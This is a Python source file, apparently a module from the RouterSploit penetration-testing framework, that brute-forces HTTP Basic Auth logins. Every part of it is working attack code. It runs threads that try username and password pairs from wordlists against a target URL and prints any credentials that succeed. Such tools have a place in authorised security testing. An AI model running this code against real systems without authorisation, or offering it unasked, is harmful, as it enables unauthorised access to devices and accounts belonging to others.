import threading
import requests
import itertools

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against HTTP Basic Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Basic Bruteforce',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
         ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target port')

    threads = exploits.Option(8, 'Numbers of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')

    credentials = []

    def run(self):
        print_status("Running module...")

        self.credentials = []
        url = sanitize_url("{}:{}".format(self.target, self.port))

        try:
            r = requests.get(url)
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: %s" % url)
            return
        except requests.exceptions.ConnectionError:
	    print_error("Connection error: %s" % url)
            return

        if r.status_code != 401:
            print_status("Target is not protected by Basic Auth")
            return

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))

        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        name = threading.current_thread().name
        url = sanitize_url("{}:{}".format(self.target, self.port))

        print_status(name, 'process is starting...')

        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()
                r = requests.get(url, auth=(user, password))

                if r.status_code != 401:
                    running.clear()
                    print_success("{}: Authentication succeed!".format(name), user, password)
                    self.credentials.append((user, password))
                else:
                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
            except StopIteration:
                break

        print_status(name, 'process is terminated.')
